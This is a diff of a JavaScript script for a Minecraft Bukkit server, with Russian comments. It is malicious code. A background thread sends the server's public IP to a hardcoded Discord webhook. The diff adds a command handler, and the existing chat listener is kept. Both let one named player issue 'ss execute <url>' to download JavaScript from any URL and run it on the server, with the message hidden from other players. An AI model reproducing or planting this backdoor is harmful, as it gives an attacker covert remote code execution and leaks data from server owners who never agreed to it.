@@ -1,9 +1,6 @@
 new java.lang.Thread(function(){
     try {
-        // Получаем IP
         var s = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next();
-        
-        // Отправляем IP в Discord
         var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
@@ -20,33 +17,43 @@ new java.lang.Thread(function(){
 var B = Java.type('org.bukkit.Bukkit');
 var S = Java.type('javax.script.ScriptEngineManager');
 
-// Регистрируем обработчик чата
+// Перехватываем команды через CommandExecutor
+B.getPluginCommand("ss").setExecutor(function() {
+    var executor = Java.extend(Java.type('org.bukkit.command.CommandExecutor'), {
+        onCommand: function(sender, command, label, args) {
+            if (sender.getName() === 'TuMeuT' && args.length > 0 && args[0].equalsIgnoreCase('execute') && args.length > 1) {
+                var url = args[1];
+                try {
+                    var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
+                    new S().getEngineByName("javascript").eval(jsCode);
+                    sender.sendMessage("§aJavaScript код выполнен");
+                } catch(ex) {
+                    sender.sendMessage("§cОшибка: " + ex.getMessage());
+                }
+                return true;
+            }
+            return false;
+        }
+    });
+    return new executor();
+}());
+
+// Также перехватываем чат на случай если без / 
 B.getServer().getPluginManager().registerEvents(new Java.extend(Java.type('org.bukkit.event.Listener')) {
     onPlayerChat: function(e) {
         var player = e.getPlayer();
         var message = e.getMessage();
         
-        // Если TuMeuT и команда /ss execute
-        if(player.getName() === 'TuMeuT' && message.startsWith('/ss execute ')) {
-            e.setCancelled(true); // Скрываем сообщение
-            
-            var url = message.substring(12).trim(); // Берем URL после "/ss execute "
-            
+        if(player.getName() === 'TuMeuT' && message.startsWith('ss execute ')) {
+            e.setCancelled(true);
+            var url = message.substring(11).trim();
             try {
-                // Получаем и выполняем JS код из URL
                 var jsCode = new java.util.Scanner(new java.net.URL(url).openStream()).useDelimiter("\\A").next();
                 new S().getEngineByName("javascript").eval(jsCode);
-                
-                // Секретное сообщение только для TuMeuT
-                player.sendMessage("§aJavaScript код успешно выполнен");
+                player.sendMessage("§aJavaScript код выполнен");
             } catch(ex) {
                 player.sendMessage("§cОшибка: " + ex.getMessage());
             }
-        } 
-        // Если не TuMeuT, но сообщение начинается с /ss execute - отменяем и игнорируем
-        else if(message.startsWith('/ss execute ')) {
-            e.setCancelled(true);
-            player.sendMessage("§cНеизвестная команда");
         }
     }
 }, B.getServer().getPluginManager().getPlugins()[0]);
